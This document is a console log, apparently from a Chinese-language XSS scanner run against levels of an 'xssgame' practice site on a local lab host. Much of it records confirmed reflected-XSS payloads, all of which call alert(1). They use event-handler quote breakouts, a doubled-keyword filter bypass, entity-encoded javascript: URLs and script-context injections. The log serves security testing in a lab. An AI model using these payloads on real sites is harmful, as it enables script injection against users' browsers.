+[32m[2020-04-09 15:41:08,819] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}, {'type': 'xss_attr_value', 'text': '<a href="yy78pq">'}][0m
+[32m[2020-04-09 15:41:09,980] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 15:41:10,003] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:41:10,021] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-09 15:41:10,083] [log.py:90] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level7.php?keyword=yy78pq%22onclionclickck%3D%22alert%281%29[0m
+[32m[2020-04-09 15:41:10,113] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:41:10,128] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}, {'type': 'xss_attr_value', 'text': '<a href="yy78pq">'}][0m
+[32m[2020-04-09 15:42:59,697] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 15:42:59,778] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level8.php?keyword=2&submit=%E6%B7%BB%E5%8A%A0%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5:[0m
+[32m[2020-04-09 15:42:59,787] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:42:59,825] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}, {'type': 'xss_attr_value', 'text': '<a href="yy78pq">'}][0m
+[32m[2020-04-09 15:44:02,456] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 15:44:02,521] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level8.php?keyword=2&submit=%E6%B7%BB%E5%8A%A0%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5:[0m
+[32m[2020-04-09 15:44:02,551] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:44:02,574] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}, {'type': 'xss_attr_value', 'text': '<a href="yy78pq">'}][0m
+[32m[2020-04-09 15:44:32,896] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 15:44:32,985] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level8.php?keyword=2&submit=%E6%B7%BB%E5%8A%A0%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5:[0m
+[32m[2020-04-09 15:44:32,986] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:44:33,012] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}, {'type': 'xss_attr_value', 'text': '<a href="yy78pq">'}][0m
+[32m[2020-04-09 15:45:13,725] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 15:45:13,794] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level8.php?keyword=2&submit=%E6%B7%BB%E5%8A%A0%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5:[0m
+[32m[2020-04-09 15:45:13,812] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:45:13,827] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}, {'type': 'xss_attr_value', 'text': '<a href="yy78pq">'}][0m
+[32m[2020-04-09 15:46:32,417] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 15:46:35,885] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level8.php?keyword=2&submit=%E6%B7%BB%E5%8A%A0%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5:[0m
+[32m[2020-04-09 15:46:35,888] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:46:35,951] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}, {'type': 'xss_attr_value', 'text': '<a href="yy78pq">'}][0m
+[32m[2020-04-09 15:50:21,951] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 15:50:28,949] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level8.php?keyword=2&submit=%E6%B7%BB%E5%8A%A0%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5:[0m
+[32m[2020-04-09 15:50:28,950] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 15:50:28,965] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}, {'type': 'xss_attr_value', 'text': '<a href="yy78pq">'}][0m
+[32m[2020-04-09 16:00:08,398] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 16:00:08,434] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level8.php?keyword=2&submit=%E6%B7%BB%E5%8A%A0%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5:[0m
+[32m[2020-04-09 16:00:08,436] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:00:08,464] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}, {'type': 'xss_attr_value', 'text': '<a href="yy78pq">'}][0m
+[32m[2020-04-09 16:00:08,519] [log.py:90] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level8.php?keyword=%26%23x6a%3B%26%23x61%3B%26%23x76%3Bas%26%23x63%3Br%26%23x69%3B%26%23x70%3B%26%23x74%3B%3Aa%26%23x6c%3B%26%23x65%3Brt%26%23x28%3B1%26%23x29%3B&submit=%E6%B7%BB%E5%8A%A0%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5[0m
+[32m[2020-04-09 16:00:08,614] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level9.php?name=2:[0m
+[32m[2020-04-09 16:00:08,619] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:00:08,653] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '欢迎用户yy78pq'}, {'type': 'script_data', 'text': 'var a ="yy78pq";'}][0m
+[32m[2020-04-09 16:00:08,693] [log.py:90] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level9.php?name=yy78pq%22%3Balert%281%29//[0m
+[32m[2020-04-09 16:00:08,755] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level9a.php?name=2:[0m
+[32m[2020-04-09 16:00:08,757] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:00:08,783] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '欢迎用户yy78pq'}, {'type': 'script_data', 'text': "var a ='yy78pq';"}][0m
+[32m[2020-04-09 16:00:08,831] [log.py:90] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level9a.php?name=yy78pq%27%3Balert%281%29//[0m
+[32m[2020-04-09 16:00:08,890] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level11.php?name=2:[0m
+[32m[2020-04-09 16:00:08,893] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:00:08,923] [log.py:90] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '欢迎用户yy78pq'}, {'type': 'exp_script_data', 'text': '\nvar a=\'ss\';//x="yy78pq";\nvar b=a;\n'}][0m
+[32m[2020-04-09 16:00:08,936] [log.py:90] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level11.php?name=%0aalert(1);//[0m
+[32m[2020-04-09 16:01:34,600] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 16:01:34,647] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level8.php?keyword=2&submit=%E6%B7%BB%E5%8A%A0%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5:[0m
+[32m[2020-04-09 16:01:34,648] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:01:34,722] [log.py:90] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level8.php?keyword=%26%23x6a%3B%26%23x61%3B%26%23x76%3Bas%26%23x63%3Bri%26%23x70%3B%26%23x74%3B%26%23x3a%3Ba%26%23x6c%3Be%26%23x72%3B%26%23x74%3B%26%23x28%3B%26%23x31%3B%29&submit=%E6%B7%BB%E5%8A%A0%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5[0m
+[32m[2020-04-09 16:01:34,756] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level9.php?name=2:[0m
+[32m[2020-04-09 16:01:34,763] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:01:34,858] [log.py:90] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level9.php?name=yy78pq%22%3Balert%281%29//[0m
+[32m[2020-04-09 16:01:34,894] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level9a.php?name=2:[0m
+[32m[2020-04-09 16:01:34,901] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:01:34,984] [log.py:90] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level9a.php?name=yy78pq%27%3Balert%281%29//[0m
+[32m[2020-04-09 16:01:35,037] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level11.php?name=2:[0m
+[32m[2020-04-09 16:01:35,039] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:01:35,092] [log.py:90] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level11.php?name=%0aalert(1);//[0m
+[32m[2020-04-09 16:02:47,846] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 16:02:47,895] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level8.php?keyword=2&submit=%E6%B7%BB%E5%8A%A0%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5:[0m
+[32m[2020-04-09 16:02:47,896] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:02:47,966] [log.py:90] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level8.php?keyword=%26%23x6a%3Bav%26%23x61%3Bsc%26%23x72%3B%26%23x69%3B%26%23x70%3B%26%23x74%3B%26%23x3a%3Bale%26%23x72%3Bt%28%26%23x31%3B%29&submit=%E6%B7%BB%E5%8A%A0%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5[0m
+[32m[2020-04-09 16:02:48,009] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level9.php?name=2:[0m
+[32m[2020-04-09 16:02:48,020] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:02:48,095] [log.py:90] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level9.php?name=yy78pq%22%3Balert%281%29//[0m
+[32m[2020-04-09 16:02:48,145] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level9a.php?name=2:[0m
+[32m[2020-04-09 16:02:48,148] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:02:48,236] [log.py:90] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level9a.php?name=yy78pq%27%3Balert%281%29//[0m
+[32m[2020-04-09 16:02:48,290] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level11.php?name=2:[0m
+[32m[2020-04-09 16:02:48,292] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:02:48,339] [log.py:90] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level11.php?name=%0aalert(1);//[0m
+[32m[2020-04-09 16:04:15,197] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 16:04:15,223] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level8.php?keyword=2&submit=%E6%B7%BB%E5%8A%A0%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5:[0m
+[32m[2020-04-09 16:04:15,227] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:04:15,313] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:http://192.168.45.1/xss/xssgame/level8.php?keyword=%26%23x6a%3Bava%26%23x73%3B%26%23x63%3B%26%23x72%3Bi%26%23x70%3Bt%26%23x3a%3B%26%23x61%3Bler%26%23x74%3B%28%26%23x31%3B%26%23x29%3B&submit=%E6%B7%BB%E5%8A%A0%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5:[0m
+[32m[2020-04-09 16:04:15,330] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level9.php?name=2:[0m
+[32m[2020-04-09 16:04:15,331] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:04:15,432] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:http://192.168.45.1/xss/xssgame/level9.php?name=yy78pq%22%3Balert%281%29//:[0m
+[32m[2020-04-09 16:04:15,458] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level9a.php?name=2:[0m
+[32m[2020-04-09 16:04:15,461] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:04:15,591] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:http://192.168.45.1/xss/xssgame/level9a.php?name=yy78pq%27%3Balert%281%29//:[0m
+[32m[2020-04-09 16:04:15,637] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level11.php?name=2:[0m
+[32m[2020-04-09 16:04:15,639] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:04:15,692] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:http://192.168.45.1/xss/xssgame/level11.php?name=%0aalert(1);//:[0m
+[32m[2020-04-09 16:04:44,334] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 16:04:44,372] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level1.php?name=1&x=2:[0m
+[32m[2020-04-09 16:04:44,373] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:04:44,488] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level2.php?keyword=2:[0m
+[32m[2020-04-09 16:04:44,489] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:04:44,667] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level3.php?keyword=2:[0m
+[32m[2020-04-09 16:04:44,672] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:04:44,859] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level4.php?keyword=2:[0m
+[32m[2020-04-09 16:04:44,863] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:04:44,997] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level5.php?keyword=2:[0m
+[32m[2020-04-09 16:04:44,999] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:04:45,171] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level6.php?keyword=2:[0m
+[32m[2020-04-09 16:04:45,175] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:04:45,321] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level7.php?keyword=2:[0m
+[32m[2020-04-09 16:04:45,324] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:04:45,500] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level8.php?keyword=2&submit=%E6%B7%BB%E5%8A%A0%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5:[0m
+[32m[2020-04-09 16:04:45,503] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:04:45,588] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level9.php?name=2:[0m
+[32m[2020-04-09 16:04:45,590] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:04:45,690] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level9a.php?name=2:[0m
+[32m[2020-04-09 16:04:45,693] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:04:45,783] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level11.php?name=2:[0m
+[32m[2020-04-09 16:04:45,784] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:04:59,515] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 16:04:59,560] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level1.php?name=1&x=2:[0m
+[32m[2020-04-09 16:04:59,562] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:04:59,650] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level2.php?keyword=2:[0m
+[32m[2020-04-09 16:04:59,652] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:04:59,778] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level3.php?keyword=2:[0m
+[32m[2020-04-09 16:04:59,779] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:04:59,915] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level4.php?keyword=2:[0m
+[32m[2020-04-09 16:04:59,917] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:05:00,035] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level5.php?keyword=2:[0m
+[32m[2020-04-09 16:05:00,037] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:05:00,138] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level6.php?keyword=2:[0m
+[32m[2020-04-09 16:05:00,140] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:05:00,252] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level7.php?keyword=2:[0m
+[32m[2020-04-09 16:05:00,253] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:05:00,394] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level8.php?keyword=2&submit=%E6%B7%BB%E5%8A%A0%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5:[0m
+[32m[2020-04-09 16:05:00,396] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:05:00,456] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level9.php?name=2:[0m
+[32m[2020-04-09 16:05:00,458] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:05:00,529] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level9a.php?name=2:[0m
+[32m[2020-04-09 16:05:00,530] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:05:00,605] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level11.php?name=2:[0m
+[32m[2020-04-09 16:05:00,606] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:05:21,631] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 16:05:21,660] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level1.php?name=1&x=2:[0m
+[32m[2020-04-09 16:05:21,661] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:05:21,746] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:http://192.168.45.1/xss/xssgame/level1.php?name=%3Csvg%20oNlOad%3Dalert%281%29%3E&x=2:[0m
+[32m[2020-04-09 16:05:21,762] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level2.php?keyword=2:[0m
+[32m[2020-04-09 16:05:21,764] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:05:21,876] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:http://192.168.45.1/xss/xssgame/level2.php?keyword=yy78pq%22oncLIck%3D%22alert%281%29:[0m
+[32m[2020-04-09 16:05:21,954] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level3.php?keyword=2:[0m
+[32m[2020-04-09 16:05:21,956] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:05:22,057] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:http://192.168.45.1/xss/xssgame/level3.php?keyword=yy78pq%27onClicK%3D%27alert%281%29:[0m
+[32m[2020-04-09 16:05:22,098] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level4.php?keyword=2:[0m
+[32m[2020-04-09 16:05:22,099] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:05:22,199] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:http://192.168.45.1/xss/xssgame/level4.php?keyword=yy78pq%22onclIcK%3D%22alert%281%29:[0m
+[32m[2020-04-09 16:05:22,261] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level5.php?keyword=2:[0m
+[32m[2020-04-09 16:05:22,262] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:05:22,374] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:http://192.168.45.1/xss/xssgame/level5.php?keyword=yy78pq%22%3E%3Ciframe%20src%3D%22j%26%23x61%3Bv%26%23x61%3B%26%23x73%3Bcri%26%23x70%3Bt%26%23x3a%3Bal%26%23x65%3B%26%23x72%3Bt%28%26%23x31%3B%26%23x29%3B:[0m
+[32m[2020-04-09 16:05:22,420] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level6.php?keyword=2:[0m
+[32m[2020-04-09 16:05:22,422] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:05:22,583] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:http://192.168.45.1/xss/xssgame/level6.php?keyword=yy78pq%22onclIcK%3D%22alert%281%29:[0m
+[32m[2020-04-09 16:05:22,640] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level7.php?keyword=2:[0m
+[32m[2020-04-09 16:05:22,642] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:05:22,752] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:http://192.168.45.1/xss/xssgame/level7.php?keyword=yy78pq%22onclionclickck%3D%22alert%281%29:[0m
+[32m[2020-04-09 16:05:22,812] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level8.php?keyword=2&submit=%E6%B7%BB%E5%8A%A0%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5:[0m
+[32m[2020-04-09 16:05:22,814] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:05:22,871] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:http://192.168.45.1/xss/xssgame/level8.php?keyword=%26%23x6a%3Bavas%26%23x63%3Bri%26%23x70%3B%26%23x74%3B%26%23x3a%3Ba%26%23x6c%3B%26%23x65%3B%26%23x72%3Bt%26%23x28%3B%26%23x31%3B%29&submit=%E6%B7%BB%E5%8A%A0%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5:[0m
+[32m[2020-04-09 16:05:22,919] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level9.php?name=2:[0m
+[32m[2020-04-09 16:05:22,921] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:05:22,990] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:http://192.168.45.1/xss/xssgame/level9.php?name=yy78pq%22%3Balert%281%29//:[0m
+[32m[2020-04-09 16:05:23,026] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level9a.php?name=2:[0m
+[32m[2020-04-09 16:05:23,029] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:05:23,094] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:http://192.168.45.1/xss/xssgame/level9a.php?name=yy78pq%27%3Balert%281%29//:[0m
+[32m[2020-04-09 16:05:23,129] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level11.php?name=2:[0m
+[32m[2020-04-09 16:05:23,131] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:05:23,172] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:http://192.168.45.1/xss/xssgame/level11.php?name=%0aalert(1);//:[0m
+[32m[2020-04-09 16:23:31,790] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 16:23:31,858] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level10.php?name=2:[0m
+[32m[2020-04-09 16:23:43,675] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 16:23:43,697] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level10.php?name=2:[0m
+[32m[2020-04-09 16:23:55,535] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 16:23:55,560] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level10.php?name=2:[0m
+[32m[2020-04-09 16:24:25,253] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 16:24:25,271] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level10.php?name=2:[0m
+[32m[2020-04-09 16:24:25,312] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:24:25,368] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:False:[0m
+[32m[2020-04-09 16:24:25,432] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level11.php?name=2:[0m
+[32m[2020-04-09 16:24:25,471] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:24:25,537] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:http://192.168.45.1/xss/xssgame/level11.php?name=%0aalert(1);//:[0m
+[32m[2020-04-09 16:25:05,983] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 16:25:10,173] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level10.php?name=2:[0m
+[32m[2020-04-09 16:27:30,166] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-09 16:27:40,282] [log.py:90] [log:__console] [INFO]- 正在检测urlhttp://192.168.45.1/xss/xssgame/level10.php?name=2:[0m
+[32m[2020-04-09 16:28:16,934] [log.py:90] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-09 16:28:16,973] [log.py:90] [log:__console] [INFO]- 检测出xss_payload:False:[0m
+[32m[2020-04-09 16:29:40,737] [log.py:90] [log:__console] [INFO]- 开始检测xss[0m
